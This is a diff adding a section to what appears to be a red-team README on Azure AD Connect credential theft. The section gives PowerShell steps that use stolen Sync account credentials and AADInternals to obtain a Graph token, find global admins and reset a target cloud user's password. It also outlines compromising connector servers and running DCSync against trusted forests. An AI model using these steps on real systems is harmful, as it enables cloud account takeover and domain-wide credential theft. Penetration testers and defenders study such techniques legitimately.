@@ -73,6 +73,30 @@ ADSync version:                 1.6.16.0
 *** ADSync passwords can be read or modified as local administrator only for ADSync version 1.3.xx.xx
 ```
 
+## Use Cases of AAD Connect credentials
+#### Lateral move from on-perm to cloud (Reset password of cloud user)
+1. Import AADInternal
+2. Request an access token for AADGraph
+```powershell
+ps> $passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
+ps> $creds = New-Object System.Management.Automation.PSCredential ("<Sync_* account>", $passwd) 
+ps> Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache 
+```
+3. Obtain Immutable ID of target user
+```powershell
+ps> Get-AADIntGlobalAdmins 
+ps> Get-AADIntUser -UserPrincipalName <target user> | select ImmutableId 
+```
+4. Reset password of target user
+```powershell
+ps> Set-AADIntUserPassword -SourceAnchor "<Immutable ID>" -Password "P@ss4Hagrid29" -Verbose 
+```
+
+#### Lateral move across AD Forest
+During different red team engagement, I noted that it is common to have [multiple forests with single Azure AD tenant](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/plan-connect-topologies#multiple-forests-single-azure-ad-tenant) topologies for Azure AD Connect. WIth this setup, we could leverage AD DS connector account to compromise trusted forests from another.
+1. Locate and compromise AAD connector servers and corresponding connector accounts that synchronizes users from other forests
+2. Execute DCSync attack with the connector account against the target forest
+
 ## Improvement
 
 - Dirk-jan found a way to remote dump AAD connect account credentials with RPC call. Check details in his [blog post](https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/)
